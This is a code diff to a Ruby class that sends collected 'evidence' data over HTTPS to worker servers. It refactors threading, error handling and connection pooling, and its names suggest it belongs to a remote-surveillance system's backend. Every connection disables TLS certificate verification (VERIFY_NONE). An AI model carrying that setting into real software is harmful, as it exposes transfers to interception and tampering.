@@ -23,14 +23,17 @@ class EvidenceTransfer
   include Singleton
   include RCS::Tracer
 
-  def start
+  def initialize
     @workers = {}
     @http = {}
     @threads = Hash.new
-    @worker = Thread.new { self.work }
   end
 
-  def work
+  def self.run
+    instance.run
+  end
+
+  def run
     # infinite loop for working
     loop do
       # pass the control to other threads
@@ -81,9 +84,10 @@ class EvidenceTransfer
                 end
             end
 
+          rescue PersistentHTTP::Error => e
+            trace :error, "Http error with worker: #{e.message}"
           rescue Exception => e
-            trace :error, "Error processing evidences: #{e.message}"
-            trace :error, e.backtrace
+            trace :error, "Error processing evidences: #{e.class} #{e.message}"
           ensure
             trace :debug, "Job for #{instance} is over (#{@threads.keys.size}/#{Thread.list.count} working threads)"
 
@@ -150,17 +154,18 @@ class EvidenceTransfer
 
     host, port = address.split(':')
 
-    http = @http[address] || (@http[address] = PersistentHTTP.new(
-                  :name         => 'PersistentToWorker' + address,
-                  :pool_size    => 20,
-                  :host         => host,
-                  :port         => port,
-                  :use_ssl      => true,
-                  :verify_mode  => OpenSSL::SSL::VERIFY_NONE
-                ))
+    http = @http[address] ||= PersistentHTTP.new(
+      :name         => 'PersistentToWorker' + address,
+      :pool_size    => 20,
+      :host         => host,
+      :port         => port,
+      :use_ssl      => true,
+      :verify_mode  => OpenSSL::SSL::VERIFY_NONE
+    )
 
-    full_headers = {'Connection' => 'Keep-Alive' }
-    request = Net::HTTP::Post.new("/evidence/#{instance}", full_headers)
+    # TODO: (?) Leaving the Connection header does not create a real persisten connection :( (osx)
+    # full_headers = {'Connection' => 'Keep-Alive'}
+    request = Net::HTTP::Post.new("/evidence/#{instance}")
     request.body = evidence
     ret = http.request(request)
 
